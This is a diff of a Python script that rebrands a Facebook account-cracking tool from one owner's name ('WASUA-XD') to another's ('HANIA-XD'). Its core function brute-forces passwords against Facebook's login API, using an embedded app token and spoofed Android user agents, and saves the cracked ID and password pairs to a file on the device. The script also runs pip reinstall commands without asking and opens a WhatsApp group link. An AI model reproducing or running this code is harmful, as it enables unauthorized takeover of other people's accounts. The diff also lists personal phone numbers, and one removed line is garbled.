@@ -1,13 +1,14 @@
-#SC OWNER_______________WASUA
+#SC OWNER_______________HANIA
 from ast import Pass
 from os import name, path
 import os,base64,zlib,pip,urllib
 from weakref import proxy
 import os,base64,zlib,platform
 from urllib.request import parse_http_list
-print('\n []\033[1;32m INSTALLING MISSING MODLEpip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
-print('\n \033[1;36m[]\033[1;37m WASUA-XD🔥 ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎.!')
-os.system('xdg-open https://wa.link/f7i3pg')
+print('\n []\033[1;32m INSTALLING MISSING MODLES...!')
+os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
+print('\n \033[1;36m[]\033[1;37m HANIA-XD🔥 ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎.!')
+os.system('xdg-open https://chat.whatsapp.com/B7mE0gHOsC7Ei5XxoBoH9F')
 try:
     from bs4 import BeautifulSoup as bsp
 except:
@@ -50,14 +51,14 @@ elif "sys.stdout.write" in x:
 else:
     pass
 #__________NEW IDX UA_____________#
-def WASU2():
+def HANI2():
  a = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/487.1.0.74.74;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/456417358;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
  b = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6525B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/434.0.0.2.99;FBCX/modulariab;]"
  M1= a + b
  return M1
     #__________NEW IDX UA_____________#
  
-def WASU1():
+def HANI1():
     en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
     kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
     fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
@@ -94,7 +95,7 @@ elif bit == '32bit':
  print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
 
  #───────────────[BIT End]───────────────────────── #
-sys.stdout.write('\x1b]2; [😜WASUA-XD😜]\x07')
+sys.stdout.write('\x1b]2; [😜HANIA-XD😜]\x07')
 def clear():
     os.system('clear')
     print(logo)
@@ -111,11 +112,11 @@ logo=(""" \033[1;38m
 \033[1;36m        VERSION  : \033[1;36m 1.5
 
 \033[1;91m----------------------------------------------
-\033[1;37m OWNER    : WASU XWD
-\033[1;31m FACEBOOK : WASU ••)
-\033[1;97m GITHUB   : WASU-XD 
-\033[1;92m WHATSAPP : 6005020676 \033[1;90m(WASU)
-\033[1;92m WHATSAPP : 6005020676 \033[1;90m(RASHID)
+\033[1;37m OWNER    : SAAD AHMAD
+\033[1;31m FACEBOOK : SAAD AHMAD ••)
+\033[1;97m GITHUB   : HANI-XD 
+\033[1;92m WHATSAPP : 03119924646 \033[1;90m(HANI)
+\033[1;92m WHATSAPP : 03368497329 \033[1;90m(RASHID)
 \033[1;33m STATUS   : TRAIL
 \033[1;91m NOTE     :\033[1;93m NO FEEDBACK NO APPROVAL 
 \33[37;41m\tBELIEVE,STRU\033[1;32mGGLE & ACHIEVE\33[0;m
@@ -133,19 +134,20 @@ R = '\033[1;91m';W = '\033[1;97m';G = '\033[1;32m';Y = '\033[1;33m';B = '\x1b[38
 loop, ok = 0, 0
 user = []
 #[===================LOGO======================]#
-sys.stdout.write('\x1b]2; [😜WASUA-XD🤪]\x07')
-logo=("""██╗    ██╗ █████╗ ███████╗██╗   ██╗
-██║    ██║██╔══██╗██╔════╝██║   ██║
-██║ █╗ ██║███████║███████╗██║   ██║
-██║███╗██║██╔══██║╚════██║██║   ██║
-╚███╔███╔╝██║  ██║███████║╚██████╔╝
- ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ 
-\033[1;38m
+sys.stdout.write('\x1b]2; [😜HANIA-XD🤪]\x07')
+logo=("""\033[1;37m /$$   /$$  /$$$$$$  /$$   /$$ /$$$$$$  /$$$$$$ 
+\033[1;38m| $$  | $$ /$$__  $$| $$$ | $$|_  $$_/ /$$__  $$
+\033[1;38m| $$  | $$| $$  \ $$| $$$$| $$  | $$  | $$  \ $$
+| $$$$$$$$| $$$$$$$$| $$ $$ $$  | $$  | $$$$$$$$
+| $$__  $$| $$__  $$| $$  $$$$  | $$  | $$__  $$
+| $$  | $$| $$  | $$| $$\  $$$  | $$  | $$  | $$
+| $$  | $$| $$  | $$| $$ \  $$ /$$$$$$| $$  | $$
+|__/  |__/|__/  |__/|__/  \__/|______/|__/  |__/
 \033[1;92m----------------------------------------------
-\033[1;32m OWNER    : WASU XWD
-\033[1;32m FACEBOOK : «⃜͢͢ « 𝐖𝐚𝐬𝐮 •⃛͢𓆪»̊3:) 🩷
-\033[1;92m GITHUB   : BHATWASUXWD
-\033[1;95m WHATSAPP : 6005020676 \033[1;90m(WASUA)
+\033[1;32m OWNER    : HANIA-XD
+\033[1;32m FACEBOOK : «⃜͢͢ « 𝐀ŋiyɑ •⃛͢𓆪»̊3:) 🩷
+\033[1;92m GITHUB   : hania-XD
+\033[1;95m WHATSAPP : 03265089431 \033[1;90m(HANIA)
 \033[1;34m VERSION  : \033[1;33m 0.5
 \033[1;35m STATUS   : FREE
 \033[1;92m-----------------------------------------------""")
@@ -163,7 +165,7 @@ def animation(u):
 def linex():
     animation(f"\033[1;37m=====================================================\x1b[1;97m")
 #[===================UA-BOX======================]#
-def WASU():
+def HANI():
     return "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/28.0.0.1.16;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/6811796;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
 #[===================MAIN-MENU======================]#
 def main():
@@ -178,7 +180,7 @@ def main():
         print("\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m TOOLS EXIT ✅")
         os.system("exit")
     else:
-        os.system("python WASU.py")
+        os.system("python HANI.py")
 #[===================SETTING'S======================]#
 def settings():
     animation(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m EXAMPLE \033[1;35m❯ \033[1;32m 10000 / 20000 / 30000 / 40000")
@@ -206,7 +208,7 @@ def settings():
 #[===================LOGO======================]#
 def FBOLDIDSFUCKER(uid, pas, tl):
     global loop, ok
-    sys.stdout.write(f"\r\r\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m [WASU-XD] \033[1;37m❨\033[1;31mCRACK\033[1;37m❩\033[1;32m %s \033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m OK \033[1;31m=\033[1;32m %s "%(loop,ok))
+    sys.stdout.write(f"\r\r\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m [HANI-XD] \033[1;37m❨\033[1;31mCRACK\033[1;37m❩\033[1;32m %s \033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m OK \033[1;31m=\033[1;32m %s "%(loop,ok))
     sys.stdout.flush()    
     try:
         for ps in pas:
@@ -237,20 +239,20 @@ def FBOLDIDSFUCKER(uid, pas, tl):
                     'content-type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                    'user-agent': WASU(),
+                    'user-agent': HANI(),
                     'accept-encoding': 'gzip, deflate',
                     'x-fb-http-engine': 'Liger'
                 }
                 url = "https://b-api.facebook.com/auth/login"
                 response = session.post(url, data=data, headers=head, verify=True).json()
                 if "access_token" in response:
-                    print(f"\n\033[1;32m[WASU-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
-                    open("/sdcard/WASU-XD.txt", "a").write(uid + "|" + ps + "\n")
+                    print(f"\n\033[1;32m[HANI-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
+                    open("/sdcard/HANI-XD.txt", "a").write(uid + "|" + ps + "\n")
                     ok+=1
                     break
                 elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                    print(f"\n\033[1;32m[WASU-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")                 
-                    open("/sdcard/WASU-XD.txt", "a").write(uid + "|" + ps + "\n")
+                    print(f"\n\033[1;32m[HANI-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")                 
+                    open("/sdcard/HANI-XD.txt", "a").write(uid + "|" + ps + "\n")
                     break
         loop+=1
     except Exception as e:
